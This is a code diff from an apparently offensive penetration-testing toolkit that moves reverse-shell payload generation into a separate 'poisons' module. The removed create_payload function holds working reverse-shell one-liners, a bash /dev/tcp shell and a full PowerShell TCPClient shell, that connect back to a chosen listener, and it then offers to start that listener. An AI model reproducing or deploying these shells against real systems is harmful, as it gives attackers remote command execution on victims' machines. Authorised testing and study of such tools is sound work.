@@ -16,6 +16,7 @@ import helpers
 import services
 import linuxdo
 import windowsdo
+import poisons
 
 # UPLOAD TO WINDOW TARGET METHODS
 UploadTo_WinMethods = [
@@ -85,50 +86,6 @@ def run_command(args):
     elif args.command == 'gbvhost':
         print('[+] Running gobuster vhost on ' + args.target_url)
         subprocess.run([['gobuster', 'vhost', '-u', args.target_url, '-w', '/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt', '>', args.target_url+'.gbvhost']])
-
-# CREATE A REVERSE, BIND, OR WEB SHELL PAYLOAD
-def create_payload(args):
-    if args.shell == 'bind':
-        print('[?] Target IP: ', end='')
-        listenIP = input()
-    else:
-        listenIP = helpers.whichIP()
-    print('[?] Listening Port [default=random]: ', end='')
-    try:
-        listenPort = input()
-    except KeyboardInterrupt:
-        exit(0)
-    if listenPort == '':
-        listenPort = 'random'
-    if listenPort == 'random':
-        random_port = random.randint(1024, 49151)
-        listenPort = str(random_port)
-    print('[+] Using port ' + listenPort)
-    print('[+] Creating payload ...')
-    # CHECK PAYLOAD OS
-    if args.shell == 'reverse':
-        if args.os == 'linux':
-            print('\n[===== LINUX PAYLOAD =====]\n')
-            print('bash -c \'bash -i >& /dev/tcp/' + listenIP + '/' + listenPort + ' 0>&1\'')
-            print('\n[=== END LINUX PAYLOAD ===]\n')
-        elif args.os == 'windows':
-            print('\n[===== WINDOWS PAYLOAD =====]\n')
-            print('powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\'' + listenIP + '\',' + listenPort + ');$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + \'PS \' + (pwd).Path + \'> \';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\"')
-            print('\n[=== END WINDOWS PAYLOAD ===]\n')
-
-        # PROMPT FOR LISTENER
-        print('[?] Would you like to run a listener? [Y/n] ', end='')
-        run_listener = input().lower()
-
-        # START LISTENER
-        if run_listener == '' or run_listener[0] == 'y':
-            services.startListener(listenIP, listenPort)
-        else:
-            print('[-] No listener was started')
-    elif args.shell == 'bind':
-        print('[!] Not yet implemented')
-    elif args.shell == 'web':
-        print('[!] Not yet implemented')
 
 # UPLOAD FILES TO
 def upload_to(args):
@@ -427,7 +384,7 @@ def main():
     # if args.module == 'run':
     #     run_command(args)
     if args.module == 'payloads':
-        create_payload(args)
+        poisons.create(args.shell, args.os)
     elif args.module == 'uploadto':
         upload_to(args)
     elif args.module == 'uploadfrom':
